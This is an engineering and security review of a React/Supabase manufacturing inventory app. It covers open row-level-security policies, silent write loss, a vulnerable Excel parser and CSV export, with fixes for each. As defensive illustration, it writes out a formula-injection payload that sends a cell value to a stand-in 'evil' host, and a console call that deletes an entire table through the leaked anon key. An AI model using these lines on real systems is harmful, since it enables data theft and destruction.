# Engineering Review — JSW Pipes & Tubes Inventory

| | |
|---|---|
| **Date** | 2026-06-29 |
| **Branch** | `claude/keen-newton-djsckg` |
| **Reviewed commit** | `d064d4a` (Merge PR #50 — Slitting multi-row baby-coil entry + searchable pickers) |
| **Scope** | Comprehensive: architecture, code quality, test coverage, performance, security (OWASP/STRIDE), accessibility (WCAG 2.1 AA), data integrity |
| **Method** | gstack engineering-review methodology (`/plan-eng-review` lenses + `/cso` security pass), applied to the existing codebase |

**How to read this report.** Every finding is written as
`[SEVERITY] (confidence: N/10) path:line — title`, followed by **Evidence** (a
quoted line), **Impact**, a **Failure scenario** for Critical/High items, and a
**Fix**. Nothing is promoted without a quoted line that exists at the reviewed
commit. Two plausible candidates were investigated and **refuted** (a Slitting
divide-by-zero and a date-parsing NaN) — see the Appendix. Intentional design
rules documented in `CLAUDE.md`/`LEARNINGS.md` (warn-don't-block,
FIFO-is-a-suggestion, proportional sibling re-split) were verified as correctly
implemented and are **not** flagged as defects.

---

> **Remediation status (2026-06-29):** the 1 Critical and 4 High findings below have
> been resolved on branch `claude/keen-newton-djsckg` (commits after `55f5ea8`):
> **C-1** open RLS → authenticated-only policies + a Supabase Auth login gate (one-time
> setup in `AUTH_SETUP.md`); **H-1** optimistic writes now roll back on sync failure;
> **H-2** `xlsx` → patched `@e965/xlsx` (`npm audit` reports 0 vulnerabilities);
> **H-3** CSV formula-injection escaping; **H-4** regression tests added (115 passing).
> The severity labels and line references below describe the **original** state at the
> reviewed commit `d064d4a`, kept as the as-of-review record.

## Executive summary

This is a feature-rich, single-file React SPA backing a real 4-stage
manufacturing pipeline (Coil Inward → Slitting → Production → Dispatch) on
Supabase. The **business core is genuinely strong**: all costing/FIFO/inventory
math lives in pure, side-effect-free helpers in `src/lib/calc.js` and is covered
by **99 passing unit tests**. The domain modelling (width-proportional baby-coil
splitting, FIFO-as-suggestion, per-order-line invoice netting) is thoughtful and
well-documented.

The problems are not in the math. They are in the **layers around it**: the
database is wide open, the UI layer has zero automated test coverage, the
optimistic-sync path can silently lose writes, and accessibility is largely
absent. One issue is a hard blocker for production.

> **Verdict: NOT production-ready as deployed.** A single Critical — the Supabase
> Row Level Security policies grant unrestricted read/write/delete to anyone with
> the public anon key — must be fixed before this handles real inventory,
> customer, or cost data. After that, the High-severity items (silent write loss,
> the `xlsx` CVEs, CSV formula injection, and the untested UI) are what stand
> between "works on the operator's machine" and "trustworthy system of record."

### Scorecard

| Dimension | Grade | Headline |
|---|:---:|---|
| Architecture | C | Clean logic/UI split into `calc.js`, but a 2,789-line monolith with deep prop-drilling and no Context. |
| Code quality | B− | Consistent, well-commented, core is tested; held back by scattered magic numbers, a duplicated eligibility check, and **no linter / formatter / CI**. |
| Test coverage | C+ | Excellent on `calc.js` (99 tests); **0% on the 2,789-line UI**, the Excel importers, and the sync layer. |
| Performance | B | Data layer is correctly paginated/batched (no N+1); client-side memoization gaps that bite as data grows. |
| Security | **F** | Open RLS = full DB compromise via the shipped anon key; vulnerable `xlsx`; CSV formula injection; no CSP. |
| Accessibility | D | Systemic ARIA gaps; custom combobox and status banners unusable by screen readers; ~11 WCAG criteria at risk. |
| Data integrity | B− | Core math correct and tested; durability gaps in the optimistic-sync path (no rollback, last-write-wins). |

**Finding counts:** 1 Critical · 4 High · 12 Medium · 6 Low · 1 systemic accessibility cluster (~25 issues).

---

## Findings by severity

### 🔴 Critical

#### [CRITICAL] (confidence: 10/10) supabase-setup.sql:215–222 — Open RLS policies grant the public anon key full read/write/delete on every table

**Evidence:**
```sql
create policy "Allow all access" on coils          for all using (true) with check (true);
create policy "Allow all access" on productions     for all using (true) with check (true);
create policy "Allow all access" on dispatches      for all using (true) with check (true);
-- …same for baby_coils, tubes, bundles, skus, purchase_orders, orders
```
The header comment is explicit: *"ROW LEVEL SECURITY — Open access (no login
required for now)"* (line 195). RLS is enabled (lines 197–204) but every policy
evaluates `using (true) with check (true)`. The anon key is shipped to the
browser in `src/lib/supabase.js:6`, and there is **no authentication anywhere in
the app**.

**Impact:** Full database compromise. The anon key is recoverable from the
client bundle by anyone who loads the deployed site. With these policies it is
equivalent to a root credential: read all costs, customers, invoices, orders;
insert, tamper, or delete any row. No audit trail.

**Failure scenario:** A competitor or disgruntled party opens the deployed URL,
reads the anon key and Supabase URL from the JS bundle, then runs
`supabase.from('dispatches').delete().neq('id','')` from a console — the entire
dispatch ledger is gone, with no authentication challenge and no log of who did
it.

**Fix:** Decide the access model and enforce it in the database, not just the UI:
1. Add Supabase Auth (even a single shared login) and change every policy to
   `using (auth.role() = 'authenticated') with check (auth.role() = 'authenticated')`; or
2. If the app must stay open on a private network, put it behind network-level
   access control (VPN/SSO proxy) and document that the DB is intentionally
   trusted-network-only. Either way, remove `using (true)` for any
   internet-reachable deployment. This is the gate item for production.

---

### 🟠 High

#### [HIGH] (confidence: 9/10) src/lib/db.js:107–116, 158–177 — Optimistic writes are never rolled back on sync failure; the UI shows data that was never persisted

**Evidence:**
```js
const update = useCallback((v) => {
  setData(prev => {
    const next = typeof v === 'function' ? v(prev) : v
    syncToSupabase(tableName, prev, next, prevIds)  // fire-and-forget, not awaited
    return next                                      // local state already committed
  })
}, [tableName])
// …
if (error) {
  console.error(`[db] Upsert error on ${tableName}:`, error.message, …)
  emitSyncError(tableName, 'upsert', error, snakeRows)   // log + banner only — no revert
}
// …
prevIdsRef.current = nextIds   // line 177: advances the baseline even when the write failed
```

**Impact:** When an upsert/delete fails (offline, RLS rejection, constraint
violation), local React state keeps the change and the baseline `prevIds`
advances as if it succeeded. The operator sees the row as saved. On the next
edit it diffs against the now-local "prev", so the failed write is **never
retried** — it silently diverges from the database until a full reload drops it.

**Failure scenario:** Operator records a production batch on flaky shop-floor
Wi-Fi. The upsert 500s. A red "Sync failed… will NOT persist on refresh" banner
flashes (App.jsx:2672) but the row stays on screen and they keep working against
it (allocating coils, dispatching). On reload the batch and everything derived
from it vanish; inventory and cost reconciliation are now wrong.

**Fix:** Make `syncToSupabase` return a result; on error revert
`setData(prev)` (or mark the row `_syncPending` and reconcile), and do **not**
advance `prevIdsRef.current` for rows that failed. Add bounded retry with
backoff for transient failures (see M-7).

#### [HIGH] (confidence: 9/10) package.json:19 — `xlsx@^0.18.5` ships known prototype-pollution and ReDoS vulnerabilities on the untrusted-Excel import path

**Evidence:** `package.json:19` pins `"xlsx": "^0.18.5"`. `npm audit` reports
GHSA-4r6h-8v6p-xvw6 (Prototype Pollution) and GHSA-5pgg-2g8v-p4x9 (ReDoS),
both **"No fix available"** on npm — the patched SheetJS builds are published
only via the vendor CDN, so `^0.18.5` from npm stays vulnerable. The library
parses operator-supplied workbooks in three places (Dispatch, PO Master, Orders
uploads) via `XLSX.read(buf, …)`.

**Impact:** A crafted `.xlsx` can pollute `Object.prototype` (corrupting
unrelated object logic across the app) or hang the tab via catastrophic regex
backtracking during parse.

**Failure scenario:** An ERP export is tampered with (or a malicious file is
mistaken for the daily dispatch sheet); uploading it freezes the browser or
silently corrupts downstream parsing of every record in that batch.

**Fix:** Migrate the import path to a maintained parser (e.g. `exceljs`), or pin
to a patched SheetJS build from the vendor registry and add the size/timeout
guards in M-6. Treat all uploaded files as untrusted input.

#### [HIGH] (confidence: 8/10) src/App.jsx:47–51 — CSV export does not neutralize spreadsheet formula injection

**Evidence:**
```js
function downloadCSV(filename, header, rows) {
  const esc = (v) => {
    const s = String(v ?? '')
    return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s   // quotes only for , " newline
  }
```
`esc()` handles delimiter/quote escaping but does nothing for a leading `=`,
`+`, `-`, or `@`. The Invoice Reconciliation export writes DB-sourced fields
(invoice no, customer, SKU description) straight through.

**Impact:** Cells beginning with a formula character execute when the CSV is
opened in Excel/Google Sheets (CSV/formula injection, CWE-1236).

**Failure scenario:** A cell value of `=HYPERLINK("http://evil/?"&A1,"refund")`
or a command payload reaches the dispatch data (trivial given the open RLS
above), an accountant opens the reconciliation CSV, and the formula fires in
their session.

**Fix:** Prefix any cell matching `/^[=+\-@\t\r]/` with a single quote before
the existing quote-escaping:
```js
const esc = (v) => {
  let s = String(v ?? '')
  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s
  return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s
}
```

#### [HIGH] (confidence: 9/10) src/App.jsx (entire UI) — Zero automated test coverage on 2,789 lines of UI, the Excel importers, and the sync layer

**Evidence:** The vitest suite is `src/lib/calc.test.js` (calculations) and
`src/lib/db.test.js` (35 lines, only `toCamel`/`toSnake`). `npm test` →
**99 tests, 2 files**. There are no component/integration tests for any of the
10 feature components, the Slitting weight re-split, the Production FIFO/manual
wiring, `mapDispatchRow`/`mapExcelRow`, `toISODate`, or `syncToSupabase`. Two
Playwright e2e specs exist; `LEARNINGS.md` flags `e2e/pipeline.spec.js` as
**stale** (drives the SKU field via native `selectOption` while the app now uses
a custom `SearchSelect`).

**Impact:** Every regression in the most-changed file (per `git log`, the UI is
where the churn is) ships unguarded. The data-integrity risks below (silent
write loss, empty mother-id on edit) are exactly the class a few integration
tests would catch.

**Failure scenario:** A refactor of the Production allocation flow passes
`calc.test.js` (untouched) and ships; the manual-vs-FIFO save predicate drifts
(the precise bug `LEARNINGS.md` 2026-06-26 records); coil consumption is
double-counted and nobody notices until stock numbers go negative.

**Fix:** Add jsdom + `@testing-library/react` and cover the high-value flows
first: Production save persists `manualAlloc` (both ids), Slitting sibling
re-split sums to mother weight, `mapDispatchRow` column matching, `toISODate`
formats, and a `syncToSupabase` failure test. Repair or delete the stale e2e
spec. Wire `npm test` into CI (see M-12).

---

### 🟡 Medium

#### [MEDIUM] (confidence: 8/10) src/lib/db.js:160 — Upsert is last-write-wins with no optimistic concurrency

`upsert(snakeRows, { onConflict: 'id', ignoreDuplicates: false })` has no
version/`updated_at` guard. Two operators (or two tabs) editing the same coil or
production record silently clobber each other; the later save wins with no
warning. **Fix:** add an `updated_at` column, compare-and-set on write, and
surface a conflict to the user instead of overwriting.

#### [MEDIUM] (confidence: 8/10) src/lib/db.js:76–80 — Read failures surface no UI error; the app silently shows empty/fallback data

On a fetch error `load()` logs to console, calls `setLoading(false)`, and
returns — only **writes** emit the `jsw:syncError` banner. **Impact:** if the
initial load fails (bad network, RLS change, expired project), the operator sees
empty pipeline tables (and `DEFAULT_SKUS`) with no indication anything is wrong,
and may "re-enter" data that already exists. **Fix:** emit a load-error state and
render a distinct "couldn't load — not empty" banner.

#### [MEDIUM] (confidence: 8/10) src/lib/supabase.js:3–6 — No validation of required env vars at boot

```js
const supabaseUrl = import.meta.env.VITE_SUPABASE_URL
const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY
export const supabase = createClient(supabaseUrl, supabaseKey)
```
If either var is missing (a common deploy misconfig), `createClient` is called
with `undefined` and the app fails late and opaquely (every query errors). **Fix:**
`if (!supabaseUrl || !supabaseKey) throw new Error('Missing VITE_SUPABASE_URL / VITE_SUPABASE_ANON_KEY')`
so misconfiguration fails loudly at startup.

#### [MEDIUM] (confidence: 7/10) src/App.jsx:824, 868–874, 925 — Production edit re-derives the mother coil id instead of preserving it; a missing baby coil collapses `hrCoilId` to `''`

The saved allocation carries both `babyCoilId` and the mother `hrCoilId`, but
`startEdit` (line 925) rebuilds rows from `babyCoilId`+`pieces` only, **dropping
the stored `hrCoilId`**; on save it is re-derived by lookup
(`baby?.hrCoilId || ''`, lines 824/872). If that baby coil no longer exists in
loaded data (baby_coils is a hard-delete/letter-reuse table), the mother id
silently becomes `''`, and `buildReconciliationRows` (calc.js:707,
`coils.find(c => c.hrCoilId === '')`) drops the coil from cost reconciliation and
the Coil Tracker. Normally guarded by the Slitting delete-guard, so latent.
**Fix:** preserve the persisted `a.hrCoilId` through the edit flow rather than
re-deriving; if a lookup ever yields `''`, warn instead of writing it.

#### [MEDIUM] (confidence: 7/10) src/App.jsx (Excel uploads) — Parsed cell values are persisted with minimal validation

`mapDispatchRow`/`mapExcelRow` coerce with a lenient `num()` (empty string on
NaN) and trim strings, but there is no positive validation that
weight/pieces > 0 and within sane bounds, nor any length/charset cap on
free-text fields before they are written to Supabase. React escaping prevents
stored-XSS on render today, but a future `title`/tooltip/`dangerouslySetInnerHTML`
would expose it, and out-of-range numbers flow into costing. **Fix:** validate
ranges and cap/whitelist string fields at import; reject or quarantine bad rows
with a per-row reason.

#### [MEDIUM] (confidence: 7/10) index.html / vercel.json — No Content-Security-Policy or hardening headers

`vercel.json` sets cache headers only; `index.html` has no CSP. There is no
`Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, or
`Referrer-Policy`. **Impact:** no defense-in-depth if any XSS or clickjacking
vector is introduced; nothing constrains where the page may exfiltrate to. **Fix:**
add a CSP (`default-src 'self'; connect-src 'self' https://*.supabase.co;
frame-ancestors 'none'`) plus the standard header set in `vercel.json`.

#### [MEDIUM] (confidence: 6/10) src/App.jsx (onUpload handlers) — No file-size limit on Excel uploads

`onUpload` reads `await file.arrayBuffer()` and parses with no size/row cap,
compounding the `xlsx` ReDoS. A large or malicious workbook can exhaust memory
and freeze the tab. **Fix:** reject files over ~10 MB before parsing and consider
a parse timeout.

#### [MEDIUM] (confidence: 10/10) src/App.jsx:517, 815, 843/862, 1048 — Magic numbers scattered and not centralized

`WIDTH_TOL_MM` (5) and `THICKNESS_TOL_MM` (0.3) are correctly exported from
`calc.js`, but the soft-fill ratio `0.97` (line 815), the "min free" picker
threshold `0.02` MT (lines 843/862), the `26`-letter baby-coil cap (line 517),
and the 97%/105% capacity tiers (line 1048) are inline literals. Tuning any of
them means grepping the monolith. **Fix:** export `SOFT_FILL`,
`MIN_FREE_WEIGHT_MT`, `MAX_BABY_COILS_PER_MOTHER`, `WARN_PCT`/`OVER_PCT` from
`calc.js` and import them.

#### [MEDIUM] (confidence: 10/10) src/App.jsx:805, 856 — Width-eligibility predicate duplicated

```js
// line 805 (FIFO pre-filter)
.filter(b => !b.deleted && (reqWidth <= 0 || Math.abs(Number(b.width || 0) - reqWidth) <= WIDTH_TOL_MM))
// line 856 (manual picker)
const widthOk = reqWidth <= 0 || Math.abs(Number(b.width || 0) - reqWidth) <= WIDTH_TOL_MM
```
Same rule, two copies — they can drift. **Fix:** extract
`isWidthEligible(babyWidth, reqWidth)` to `calc.js` and call it from both (add a
unit test while you're there).

#### [MEDIUM] (confidence: 9/10) src/App.jsx:104, 204 + Production — Hot components not memoized; inline handlers recreated each render

`SearchSelect` (line 104) and `DataTable` (line 204) are not wrapped in
`React.memo`; the Production `columns` array and ~30 inline `onChange` closures
(e.g. lines 701, 973, 1021) are rebuilt every render, and Production has a
~6-deep `useMemo` chain (`babyAsCoils → consumedByCoil → rawAlloc → alloc →
fifoRows`, plus `babyCoilOptions → matchedCount`, `enriched`). Fine at today's
data sizes; visibly sluggish once `productions`/`babyCoils` reach the hundreds.
**Fix:** `React.memo` the two leaf components, `useMemo` the `columns`, and
`useCallback` the handlers passed to memoized children.

#### [MEDIUM] (confidence: 10/10) package.json / repo root — No ESLint, Prettier, type-checking, or CI

devDependencies contain no `eslint`/`prettier`; there is no root
`.eslintrc`/`prettier.config`/`tsconfig.json` (only copies inside
`node_modules`), and **no `.github/` directory** (confirmed absent). The lone
`eslint-disable` at `src/lib/db.js:104` is the fossil of a since-removed setup.
**Impact:** no automated guard against unused vars, missing hook deps, or style
drift; nothing runs the 99 tests on push. **Fix:** add ESLint
(`eslint-plugin-react-hooks` especially), Prettier, and a minimal GitHub Actions
workflow running `npm test` + lint on PRs.

#### [MEDIUM] (confidence: 10/10) src/App.jsx:1–2789 & CLAUDE.md:56 — Single-file monolith, and the doc undercounts it by ~64%

`src/App.jsx` is 2,789 lines holding 10 feature components (Dashboard 407 lines,
SalesDashboard 250, Slitting 325, Production 308, …) plus all UI primitives.
`CLAUDE.md:56` still describes it as *"~1700 lines."* The pre-created
`src/components`, `src/pages`, `src/hooks` directories are empty. **Impact:**
high cognitive load, components can't be unit-tested in isolation, merge-conflict
surface is large. **Fix:** extract the two dashboards and the four stage forms
into `src/components/*`, sharing `calc.js`; update the CLAUDE.md figure (and
prefer "see `wc -l`" over a hard-coded count).

#### [MEDIUM] (confidence: 10/10) src/App.jsx:2765–2774 — Deep prop-drilling with no Context

Every store is threaded from the App root through props (Dashboard takes 7,
Production 6). Adding or refactoring a store touches every call site. **Fix:**
expose the read-mostly stores (coils, babyCoils, productions, dispatches, skus)
via a small `AppContext`, keeping setters explicit.

---

### 🟢 Low

- **[LOW] (8/10) src/App.jsx:47–61 — `URL.revokeObjectURL` not in `finally`.** If
  `appendChild`/`click` throws, the blob URL leaks. Wrap the DOM steps in
  try/finally.
- **[LOW] (6/10) src/lib/calc.js:670 — `dispatchCoilTrace` weight-per-piece float
  drift.** `head.weight / head.pieces` then `take * wpp` accumulates sub-gram
  rounding. Acceptable at MT scale; note it if reconciliation ever needs exact
  ties.
- **[LOW] (9/10) src/App.jsx:17 — Dead commented seed import.** `seedData` import
  is commented out and the arrays are empty; remove for clarity.
- **[LOW] (6/10) src/lib/db.js:88–93 — Purge-on-load is a write side effect of a
  read.** Hard-delete tables delete legacy `deleted` rows during `load()`; works,
  but a server-side scheduled purge or trigger is cleaner and avoids every client
  issuing the delete.
- **[LOW] (5/10) Dependency hygiene — transitive `postcss`/`vite` advisories.**
  Real but low real-world impact here (no user-authored CSS; the `vite`
  `fs.deny` issue is dev-only/Windows). Pick up via `npm audit fix` on the next
  dependency pass; not a deploy blocker.
- **[LOW] (4/10) Bundle size — 944 KB raw / 249 KB gzipped, `xlsx` ~429 KB of it.**
  `xlsx` is already lazy-loaded via dynamic `import()`; revisit only if first-load
  on slow links becomes a complaint.

---

## Lens detail

### 1. Architecture

The **logic/UI separation is the best architectural decision in the codebase**:
`calc.js` is pure, framework-free, and exhaustively tested, so the hardest part
of the domain (FIFO, proportional splitting, invoice netting) is isolated and
trustworthy. Everything else lives in one 2,789-line `App.jsx`. State is held at
the root and prop-drilled (M-14); there is no Context and the prepared
`components/`, `pages/`, `hooks/` directories are empty. The data layer is a
single well-chosen abstraction (`useSupabaseStore`). Net: sound foundations,
under-decomposed shell. Single points of failure: the Supabase project (no
offline/queue fallback) and the monolith file itself as a merge bottleneck.

### 2. Code quality

Readable and consistent, with unusually good explanatory comments and a
disciplined "warn-don't-block" philosophy. The drag is mechanical: scattered
magic numbers (M-9), a duplicated eligibility predicate (M-10), a dead import
(L), and — most importantly — **no automated quality gate at all** (M-12). For a
system of record tracking cost and inventory, the absence of lint + CI is the
highest-leverage gap here: it's what lets the other categories regress quietly.

### 3. Test coverage

```
CODE PATHS                                   COVERAGE
src/lib/calc.js  (pure business logic)       [★★★ TESTED]  99 tests in calc.test.js
  ├── coilFifoAllocate / coilConsumption       ★★★ happy + tolerance + over-fill bands
  ├── producedPool / skuInventoryRows          ★★★ netting, per-line invoice math
  ├── distributor identity / reconciliation    ★★★ grouping, fallbacks
  └── formatters / period ranges               ★★★ UTC boundaries, leap years
src/lib/db.js    (sync layer)
  ├── toCamel / toSnake                         ★   shape only (db.test.js, 35 lines)
  ├── syncToSupabase (upsert/delete/diff)      [GAP] — failure & rollback untested
  └── pagination / purge-on-load               [GAP]
src/App.jsx      (2,789 lines, 10 components)
  ├── Production: manual vs FIFO save          [GAP] [→ integration]  ← highest risk
  ├── Slitting: sibling weight re-split        [GAP] [→ integration]
  ├── Dispatch/PO/Orders Excel import          [GAP] [→ integration]
  ├── toISODate / mapDispatchRow               [GAP] [→ unit, easily extractable]
  └── forms / validation / banners             [GAP]
e2e/ (Playwright)
  ├── pipeline.spec.js                         [STALE] selectOption vs SearchSelect
  └── slitting-multi.spec.js                   [★★ ] multi-row baby-coil entry

COVERAGE: calc.js ~strong · db.js ~minimal · App.jsx ~0% · e2e partial (1 of 2 stale)
```
The calculation engine is a model of testability. The untested surface is
precisely the churn-heavy, integrity-critical UI and import code. Priority
additions: a `syncToSupabase` failure/rollback test (guards H-1), a Production
save-persistence test (guards M-4 and the documented manual/FIFO predicate), and
pulling `toISODate`/`mapDispatchRow` out for direct unit tests.

### 4. Performance

The data layer is right: keyset pagination at 1,000/page with a stable
`created_at,id` order (db.js:64–84), single-pass O(n) aggregation in
`coilConsumption`, and one batched `upsert` per mutation — **no N+1**. The
weakness is client re-rendering (M-11): unmemoized leaf components and inline
closures make the Production form re-render broadly. It's invisible today and
will degrade gradually with data volume, not abruptly.

### 5. Security (OWASP / STRIDE)

Dominated by the Critical: with `using (true)` policies, the shipped anon key is
a full-access DB credential (OWASP A01 Broken Access Control / STRIDE
Elevation-of-Privilege + Tampering + Information-Disclosure, all at once).
Layered on top: a vulnerable parser on an untrusted-input path (A06, H-2), CSV
formula injection (A03, H-3), no input validation at import (M-5), and no CSP
(A05, M-6). The anon key in the bundle is normal for Supabase **only when RLS is
restrictive** — here it is not, which is what makes it Critical rather than
expected.

### 6. Accessibility (WCAG 2.1 AA)

Systemic rather than incidental — the app was built without ARIA. The highest
-impact items:
- **Custom combobox `SearchSelect` (App.jsx:104–165)** has keyboard arrow/enter
  handling but no `role="combobox"/"listbox"/"option"`, `aria-expanded`, or
  `aria-activedescendant`, so screen-reader users can't perceive or operate it.
- **Status banners** (sync error App.jsx:2672; upload results) lack
  `role="alert"`/`aria-live`, so failures are announced to no one.
- **Icon-only buttons** (dark-mode toggle App.jsx:2729 `title` only; row `✕`/Del)
  lack `aria-label`.
- **Labels not associated** (Field, App.jsx:73) — no `htmlFor`/`id`; clicks don't
  focus, errors aren't linked via `aria-describedby`.
- **Tabs** (App.jsx:2747) are plain buttons — no `role="tablist"/"tab"`,
  `aria-selected`, or arrow-key navigation.
- **Color-only status** in `Badge` (App.jsx:67) — `✔`/`⚠` glyphs help, but pair
  with text/`role`.

~11 WCAG AA success criteria are at risk (1.1.1, 1.4.1, 2.1.1, 2.4.3, 2.4.7,
3.3.1, 3.3.2, 4.1.2, 4.1.3, …). None are hard to fix; they're just absent.

### 7. Data integrity

The math you can trust — proportional sibling re-split, FIFO-as-suggestion (never
auto-saved), and both `babyCoilId`+`hrCoilId` carried through were all verified
correct and are unit-tested. The risks are in **durability and edit flows**, not
calculation: writes that fail aren't rolled back (H-1), concurrent edits clobber
(M-1), and the edit path re-derives the mother id instead of preserving it (M-4).
These are the difference between "the numbers are right when everything succeeds"
and "the numbers stay right under failure and contention."

---

## Strengths (keep these)

- **Pure, isolated, well-tested business core.** `calc.js` + 99 tests is the
  right architecture for the hard part of this domain. Most apps this size don't
  have it.
- **Thoughtful domain modelling.** Per-order-line invoice netting, distributor
  identity resolution by stable code, width-proportional cost splitting, and the
  deliberate "warn, never block" stance show real understanding of the operators'
  reality.
- **Correct, efficient data access.** Keyset pagination and batched upserts avoid
  the usual Supabase footguns (1000-row truncation, N+1).
- **Excellent in-repo documentation.** `CLAUDE.md` + `LEARNINGS.md` capture the
  why, the dated decisions, and the durable rules. This review was faster because
  of them.
- **Lean dependency surface** and clean, consistent component conventions.

---

## Remediation roadmap

Effort shown as human-team vs. CC+gstack (the AI-compression framing).

### P1 — before any production / real-data deployment
| # | Item | Effort (human → CC) |
|---|---|---|
| C-1 | Replace open RLS policies with auth-gated ones (or put behind network access control); add Supabase Auth | 1–2 days → ~1–2 h |
| H-1 | Roll back optimistic state on sync failure; stop advancing `prevIds` on error | 0.5 day → ~30 m |
| H-3 | Neutralize CSV formula injection in `downloadCSV` | 1 h → ~5 m |
| M-3 | Validate env vars at boot (fail loud) | 15 m → ~5 m |

### P2 — before trusting it as system of record
| # | Item | Effort (human → CC) |
|---|---|---|
| H-2 / M-6 | Replace/patch `xlsx`; add upload size + parse-timeout guards | 1 day → ~30 m |
| H-4 | jsdom + Testing Library; cover Production save, Slitting re-split, importers, `syncToSupabase` failure; fix/remove stale e2e | 3–4 days → ~2–3 h |
| M-12 | ESLint + Prettier + GitHub Actions (`npm test` + lint on PR) | 0.5 day → ~20 m |
| M-1 | Optimistic-concurrency (`updated_at` compare-and-set) | 1 day → ~45 m |
| M-2 | Distinct load-error banner | 2 h → ~15 m |
| M-4 | Preserve stored `hrCoilId` through Production edit | 2 h → ~15 m |
| M-5 | Validate/bound Excel-imported values | 0.5 day → ~30 m |
| M-6 | Add CSP + security headers in `vercel.json` | 1 h → ~10 m |

### P3 — maintainability & polish
| # | Item | Effort (human → CC) |
|---|---|---|
| M-9 / M-10 | Centralize magic numbers; extract `isWidthEligible` (+ test) | 2 h → ~15 m |
| M-13 / M-14 | Split `App.jsx` into `components/`; add `AppContext`; fix CLAUDE.md line count | 2–3 days → ~3–4 h |
| M-11 | `React.memo` SearchSelect/DataTable; `useCallback`/`useMemo` hot paths | 0.5 day → ~30 m |
| WCAG | Accessibility pass (combobox ARIA, `aria-live` banners, labels, tabs, icon labels) | 2–3 days → ~2 h |
| Low | blob-URL `finally`, dead-import cleanup, server-side purge, `npm audit fix` | 2 h → ~15 m |

---

## Appendix

### A. Candidates investigated and refuted (evidence gate)

- **Slitting divide-by-zero (App.jsx:507).** The weight split is guarded by
  `parentCoil && width > 0 && sumBabyWidths > 0 ? (width / sumBabyWidths) * motherW : 0`,
  and only `width > 0` rows persist. No NaN reaches a record. **Not a bug.**
- **`toISODate` Invalid Date → `"NaN-NaN-NaN"` (App.jsx:2071).** `fromDate`
  guards with `if (isNaN(d)) return ''`. Global `isNaN` coerces the Date via
  `valueOf()`, so an Invalid Date yields `isNaN(NaN) === true` and returns `''`.
  Unparseable input degrades to empty string, not corruption. **Not a bug.**
- **Nested JSONB case conversion.** `toCamel`/`toSnake` are top-level only by
  design; every read of `coilAllocations`/`bundleEntries` in `calc.js` and
  `App.jsx` uses camelCase inner keys consistently. **Verified consistent.**
- **FIFO auto-save.** `save()` persists `manualAlloc` only (App.jsx:901–904);
  FIFO is copied in solely via "Use suggestion". **Design rule verified.**

### B. Files reviewed first-hand

`src/lib/calc.js`, `src/lib/db.js`, `src/lib/supabase.js`,
`src/App.jsx` (downloadCSV, SearchSelect, Production allocation+save, toISODate,
app shell), `supabase-setup.sql`, `package.json`, `CLAUDE.md`; plus targeted
agent sweeps for security, accessibility, architecture/perf, and
data-integrity. CI/lint absence and the App.jsx line count verified directly.

### C. Test run (reviewed commit)

```
$ npm test   # vitest run
 Test Files  2 passed (2)
      Tests  99 passed (99)
 (src/lib/calc.test.js, src/lib/db.test.js)
```
No tests cover `src/App.jsx` or the sync/import code paths.
